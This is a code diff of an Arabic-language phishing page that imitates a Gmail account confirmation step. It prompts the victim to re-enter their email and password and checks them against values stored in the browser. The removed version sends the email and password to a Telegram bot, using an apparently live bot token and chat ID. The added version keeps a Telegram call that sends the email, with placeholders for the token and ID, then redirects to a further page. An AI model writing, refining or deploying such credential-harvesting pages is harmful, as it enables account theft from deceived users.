@@ -1,47 +1,36 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl" lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>Gmail - تأكيد المعلومات</title>
-  <style>
-    body { font-family: Arial; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; }
-    .box { width: 300px; padding: 30px; border: 1px solid #ccc; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-    input, button { width: 100%; padding: 10px; margin: 10px 0; font-size: 16px; border-radius: 4px; border: 1px solid #ccc; }
-    button { background: #34a853; color: white; border: none; }
-  </style>
+  <title>تأكيد الحساب</title>
 </head>
 <body>
-  <div class="box">
-    <h2>أعد تأكيد معلوماتك</h2>
-    <input type="text" id="email2" placeholder="البريد الإلكتروني">
-    <input type="password" id="password2" placeholder="كلمة المرور">
-    <button onclick="verify()">تأكيد</button>
-    <div id="msg" style="margin-top:10px; color:red;"></div>
-  </div>
+  <h2>تأكيد البريد الإلكتروني</h2>
+  <form id="confirmForm">
+    <input type="email" id="confirmEmail" placeholder="أعد إدخال البريد الإلكتروني" required><br>
+    <input type="password" id="confirmPassword" placeholder="أعد إدخال كلمة المرور" required><br>
+    <button type="submit">تأكيد</button>
+  </form>
 
   <script>
-    function verify() {
-      const email2 = document.getElementById("email2").value;
-      const password2 = document.getElementById("password2").value;
+    document.getElementById("confirmForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const confirmEmail = document.getElementById("confirmEmail").value;
+      const confirmPassword = document.getElementById("confirmPassword").value;
 
-      const email1 = localStorage.getItem("email");
-      const password1 = localStorage.getItem("password");
+      const originalEmail = localStorage.getItem("email");
+      const originalPassword = localStorage.getItem("password");
 
-      if (email2 === email1 && password2 === password1) {
-        fetch(`https://api.telegram.org/bot7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: "7493001551",
-            text: `✅ Gmail Confirmed:\n📧 Email: ${email2}\n🔑 Password: ${password2}`
-          })
-        });
+      if (confirmEmail === originalEmail && confirmPassword === originalPassword) {
+        // إرسال تأكيد إلى Telegram
+        fetch(`https://api.telegram.org/bot<توكنك>/sendMessage?chat_id=<IDك>&text=✅ تأكيد مطابق\nEmail: ${confirmEmail}`);
 
-        window.location.href = "gmail_verify.html";
+        // الانتقال للصفحة الثالثة
+        window.location.href = "vifry.html";
       } else {
-        document.getElementById("msg").innerText = "❌ لا يوجد تطابق، الرجاء إدخال المعلومات الصحيحة.";
+        alert("❌ البيانات غير متطابقة، حاول مرة أخرى.");
       }
-    }
+    });
   </script>
 </body>
 </html>
